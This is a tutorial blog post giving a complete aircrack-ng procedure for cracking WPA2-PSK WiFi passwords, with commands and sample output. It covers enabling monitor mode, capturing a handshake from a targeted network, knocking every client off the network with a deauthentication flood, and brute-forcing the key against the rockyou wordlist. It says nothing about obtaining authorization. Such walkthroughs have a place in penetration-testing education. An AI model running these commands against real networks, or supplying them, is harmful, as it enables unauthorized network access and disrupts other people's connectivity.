# Cracking WiFi WPA2-PSK2 with aircrack-ng

In order to crack WPA2-PSK2, you will need an adapter that can be put into Monitor mode. Most internal WiFi adapters cannot, so you will likely need a USB adapter. I use an [Alfa AUS036ACM](https://amzn.to/4dHXJ62) which works out of the box with Kali Linux. You can also view the full list of [supported adapters](https://www.aircrack-ng.org/doku.php?id=compatible_cards).

`lsusb` will show you connected USB devices. `ip a` or `ifconfig` will show you adapters. Finally `iwconfig` will show you WiFi adapters and whether or not they are in Monitor mode.

```sh
> iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off
```

To view all WiFi APs in range, you can use `iwlist wlan0 scan`.

## Switching into Monitor Mode

```sh
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```
Note that this changes `wlan0` to `wlan0mon`.

## Capturing Frames

```sh
sudo airodump-ng wlan0mon
```
Hit `CTRL+C` once you find the access point that you want to attack and note the BSSID and channel so that we can use it.

## Dump traffic from the access point

```sh
sudo airodump-ng --bssid C2:57:0B:9D:48:AE -c 9 --write spark.dump wlan0mon
```

Once a client connects, you will see `WPA handshake` at the top of the output. You can `CTRL+C` to quit.

```txt
CH  9 ][ Elapsed: 4 mins ][ 2024-08-12 18:05 ][ WPA handshake: C2:57:0B:9D:48:AE

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 C2:57:0B:9D:48:AE  -20 100     2326       65    0   9  360   WPA2 CCMP   PSK  Spark-Guest

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 C2:57:0B:9D:48:AE  F6:2B:45:62:2E:EE  -27    6e- 6e     0      721  EAPOL  Spark-Guest
Quitting...
```

If a client does not connect in a reasonable amount of time, you can kick everyone off the network by sending a `dauth` and having them reconnect. In another terminal window,

```sh
sudo aireplay-ng --deauth 100 -a C2:57:0B:9D:48:AE wlan0mon
```

When you are done, you will find five files created in the current directory. The `cap` file contains the captured handshake.

```txt
spark.dump-01.cap
spark.dump-01.csv
spark.dump-01.kismet.csv
spark.dump-01.kismet.netxml
spark.dump-01.log.csv
```

## Cracking the password

```sh
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b C2:57:0B:9D:48:AE spark.dump-01.cap
```

This will go through the possibilities in the wordlist and use them to attempt to find the key which I have removed in the output below 😊.

```txt
                               Aircrack-ng 1.7

      [00:00:03] 17264/14344392 keys tested (6309.92 k/s)

      Time left: 37 minutes, 50 seconds                          0.12%

                           KEY FOUND! [ ******** ]


      Master Key     : 3C D2 15 84 1D B5 F5 26 F4 73 94 09 0F A0 C2 36
                       2A 87 69 E4 E8 2D FA 80 09 5B A3 75 D5 68 31 EE

      Transient Key  : A8 6C 34 59 6D 78 DD D4 0E DF 73 7E D9 4C 35 48
                       75 C2 E7 F3 FD E1 70 D2 8C 78 FF 9D BA EC 17 E9
                       4E 25 91 AA 2F 8E 03 4C BC 48 63 1A CB B9 48 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

      EAPOL HMAC     : 1B BB D0 54 AF FB 0E 2B 77 DB 77 A4 62 27 DC 25
```

## Bringing the network back up

Once you are done, you will need to restart the network services that were killed and bring the network adapters back up.

```sh
sudo service wpa_supplicant restart
sudo service NetworkManager restart
sudo airmon-ng stop wlan0mon
sudo ifconfig wlan0 up
ip a
```
